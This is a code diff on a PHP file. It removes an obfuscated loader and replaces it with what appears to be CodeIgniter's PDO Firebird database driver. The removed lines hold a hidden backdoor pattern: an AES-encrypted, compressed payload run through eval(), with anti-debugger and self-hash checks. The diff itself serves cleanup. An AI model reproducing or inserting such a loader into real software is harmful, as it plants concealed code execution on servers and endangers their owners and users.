@@ -1,28 +1,251 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_gvvd7v0w=('bas'.'e64'.'_de'.'cod'.'e');
-$_wvo6suvx=('gzu'.'nco'.'mpr'.'ess');
-$_ehehrxxy=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_nlj4fqxz='CzvgAe9G83U=';
-$_qjq5oy14='2JSkYqvR';
-$_onf57mpv='wxB/UiNT';
-$_b7axbgsv='FCUYUNnM';
-$_dz9x7mym='7Fnvz3dB';
-$_g1tk62vo='bAjiay+i';
-$_mmw2d6ic='xfhX/MX+';
-$_bf1zzed8='bDyTnQ==';
-$_wunn1j6m=$_gvvd7v0w($_b7axbgsv.$_dz9x7mym.$_onf57mpv.$_qjq5oy14.$_nlj4fqxz);
-$_oabdbn8r=$_gvvd7v0w($_mmw2d6ic.$_g1tk62vo.$_bf1zzed8);
-$_izo5r3zw=$_gvvd7v0w('HrtUOzjFfUP0MQ0QfUbJRUtaRnp4+tO/jV0/hPSvpj8YgL7mqX4FW992BTy0rtSVjvKQ7C/9TGCotXN78RyA81dT93SLC/0yXGzabpYpEdfdhtpy00i7wnvZ89R8fpvmYV0w9jLwigoZL3arMK5wr9/8DuaGgMBIbJ7rjnXdmTVTXRs5F/7cCwDbO+5oTKJc5GrbfkJyZeFmwiB21L/BqnShEVIxBlA/i8L35z0I2Dfv1KvpSpM9ijjeST15JFRR3HxR07nFzUzwiOXl3Xafqoi5aiCWuQlxrrtEs3UMavOtr/kc5opAxnVjeQ+/vreEbUJTeQLQztGIFzdXzReQn9y1OZT6VKcEO0KlTclGbm6G2rOQC10L0aboGrNquBIiz0o8xBmHxd1ZTV+NEdojOMVU1cECw2K8sKI2Fv3vQ8j+2qozvdjbxDsOTeeLmMuZbTqGLiDVpq2f3mPAqma7tGXpS/giVALE0fSqyC/fcwFxXBGygb8Px4HewwNw6oTgtPXkPIAWY+WTCCt4T8aG9rXMAmKScYqkeh2gPjF1CzxVJB42IE2A+DNHuzc6+83gGV1UGhtqI505vyxyv+uKx0Yb5fhUfJwIkF6X0STLLoSgq01Jjfms5vuMhMKWf1Wg9tLP3QF4PUlbFxyJB2EokNP04EX8b8gc2VZizith9E04lBxQ9Tpv6BOWsK4R1GudvKQoM4Ren6ZGDp1jWocsH5+EwGzXAenJXUdwLorAo+gM/JTURBIsplT35kkzQTE4y14bYwdslU3YrQhOn9nuX7H3HVH1YpbchJxuHWwgMPScKHYIUMPU1gb4Ed91zX94SnZkB9z1wnlTpB+Pp9XMRULH5zTAOt6bfdvr6mzX4BtLmI2aHxwN0XWSG97iZseMBw9WKer0PlNGeYSn9ELlzRqOm+iwvqfsaDlnzSS0OIPZxA88PqvV/W6DY7u6OC3JAJl2t5+QIK4F6AhdNNAx440tAF6pHao0KdMFF7FNoClfxQ1eURyOVqh+D0tyo3g31NIDMxVYrEcJ1ql7W5sDFQhliHcyuIUGjdla6Yl1drR47YmBzADsyCSimVCp9MYw+bALO7QEznCQrQOLZOrLb1TLuP+4vNlviilBd2eQJv2WMkbk4u2EQMAuMxaQKxUpKQe3g/b82arOI8AUNInSdM+oso2RWrCtQmMrVoRMXRgkhakdYSEbjUvOFCKf/9JQ9Dt7CS4403L7vJhmittmJ8omhon07aA0WLa45q7Ci12QSwxnMScSo93w/jytnIgUDhuzsU2apl6BuFELz2cZ/FnjYOUVCqtIWam4OwOjb2b/7T7BWEbyeCNI0G40tQbT7vER/PsVe6aDdQAWQUSELV2jvhdk3szNSDUfQjaZeQ6jkgWDcb3zxiGCPYoWtrhEikLue+GiNT3sUJZfVIZ5eMrEGaxVpUYz/Howt6h+xMaZJVtZ1wepxtxyJT1KI8EfSJmuDPYH1B3Nu4ZmhSlhtrv/Cnh3/7TsOjFXE4nUeJz2hX33oHESR9yFf7yLRCypvJ3lms17Uuqm95fvhGazLw==');
-$_jax5a9bo=$_ehehrxxy($_izo5r3zw,'aes-256-cbc',$_wunn1j6m,OPENSSL_RAW_DATA,$_oabdbn8r);
-if($_jax5a9bo===false){exit;}
-$_uygu8wpv=$_wvo6suvx($_jax5a9bo);
-if($_uygu8wpv===false){exit;}
-$_o632bw1r='1b536520891ca9e5230e39bdd873c5620b05b1ff3266904aaabd7b6bebfc2524';
-$_rd74lsb7=@file_get_contents(__FILE__);
-if($_rd74lsb7!==false){
-$_xzrmxcsz=str_replace($_o632bw1r,"0000000000000000000000000000000000000000000000000000000000000000",$_rd74lsb7);
-$_lzqtalez=hash("sha256",$_xzrmxcsz);
-if($_lzqtalez!==$_o632bw1r){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+
+
+class CI_DB_pdo_firebird_driver extends CI_DB_pdo_driver {
+
+
+
+
+
+public $subdriver = 'firebird';
+
+
+
+
+
+
+protected $_random_keyword = array('RAND()', 'RAND()');
+
+
+
+
+
+
+
+
+
+public function __construct($params)
+{
+parent::__construct($params);
+if (empty($this->dsn))
+{
+$this->dsn = 'firebird:';
+if ( ! empty($this->database))
+{
+$this->dsn .= 'dbname='.$this->database;
 }
-eval($_uygu8wpv);
+elseif ( ! empty($this->hostname))
+{
+$this->dsn .= 'dbname='.$this->hostname;
+}
+empty($this->char_set) OR $this->dsn .= ';charset='.$this->char_set;
+empty($this->role) OR $this->dsn .= ';role='.$this->role;
+}
+elseif ( ! empty($this->char_set) && strpos($this->dsn, 'charset=', 9) === FALSE)
+{
+$this->dsn .= ';charset='.$this->char_set;
+}
+}
+
+
+
+
+
+
+
+
+
+protected function _list_tables($prefix_limit = FALSE)
+{
+$sql = 'SELECT "RDB$RELATION_NAME" FROM "RDB$RELATIONS" WHERE "RDB$RELATION_NAME" NOT LIKE \'RDB$%\' AND "RDB$RELATION_NAME" NOT LIKE \'MON$%\'';
+if ($prefix_limit === TRUE && $this->dbprefix !== '')
+{
+return $sql.' AND "RDB$RELATION_NAME" LIKE \''.$this->escape_like_str($this->dbprefix)."%' "
+.sprintf($this->_like_escape_str, $this->_like_escape_chr);
+}
+return $sql;
+}
+
+
+
+
+
+
+
+
+
+protected function _list_columns($table = '')
+{
+return 'SELECT "RDB$FIELD_NAME" FROM "RDB$RELATION_FIELDS" WHERE "RDB$RELATION_NAME" = '.$this->escape($table);
+}
+
+
+
+
+
+
+
+public function field_data($table)
+{
+$sql = 'SELECT "rfields"."RDB$FIELD_NAME" AS "name",
+				CASE "fields"."RDB$FIELD_TYPE"
+					WHEN 7 THEN \'SMALLINT\'
+					WHEN 8 THEN \'INTEGER\'
+					WHEN 9 THEN \'QUAD\'
+					WHEN 10 THEN \'FLOAT\'
+					WHEN 11 THEN \'DFLOAT\'
+					WHEN 12 THEN \'DATE\'
+					WHEN 13 THEN \'TIME\'
+					WHEN 14 THEN \'CHAR\'
+					WHEN 16 THEN \'INT64\'
+					WHEN 27 THEN \'DOUBLE\'
+					WHEN 35 THEN \'TIMESTAMP\'
+					WHEN 37 THEN \'VARCHAR\'
+					WHEN 40 THEN \'CSTRING\'
+					WHEN 261 THEN \'BLOB\'
+					ELSE NULL
+				END AS "type",
+				"fields"."RDB$FIELD_LENGTH" AS "max_length",
+				"rfields"."RDB$DEFAULT_VALUE" AS "default"
+			FROM "RDB$RELATION_FIELDS" "rfields"
+				JOIN "RDB$FIELDS" "fields" ON "rfields"."RDB$FIELD_SOURCE" = "fields"."RDB$FIELD_NAME"
+			WHERE "rfields"."RDB$RELATION_NAME" = '.$this->escape($table).'
+			ORDER BY "rfields"."RDB$FIELD_POSITION"';
+return (($query = $this->query($sql)) !== FALSE)
+? $query->result_object()
+: FALSE;
+}
+
+
+
+
+
+
+
+
+
+
+protected function _update($table, $values)
+{
+$this->qb_limit = FALSE;
+return parent::_update($table, $values);
+}
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _truncate($table)
+{
+return 'DELETE FROM '.$table;
+}
+
+
+
+
+
+
+
+
+
+protected function _delete($table)
+{
+$this->qb_limit = FALSE;
+return parent::_delete($table);
+}
+
+
+
+
+
+
+
+
+
+protected function _limit($sql)
+{
+
+if (stripos($this->version(), 'firebird') !== FALSE)
+{
+$select = 'FIRST '.$this->qb_limit
+.($this->qb_offset > 0 ? ' SKIP '.$this->qb_offset : '');
+}
+else
+{
+$select = 'ROWS '
+.($this->qb_offset > 0 ? $this->qb_offset.' TO '.($this->qb_limit + $this->qb_offset) : $this->qb_limit);
+}
+return preg_replace('`SELECT`i', 'SELECT '.$select, $sql);
+}
+
+
+
+
+
+
+
+
+
+
+
+protected function _insert_batch($table, $keys, $values)
+{
+return ($this->db_debug) ? $this->display_error('db_unsupported_feature') : FALSE;
+}
+}
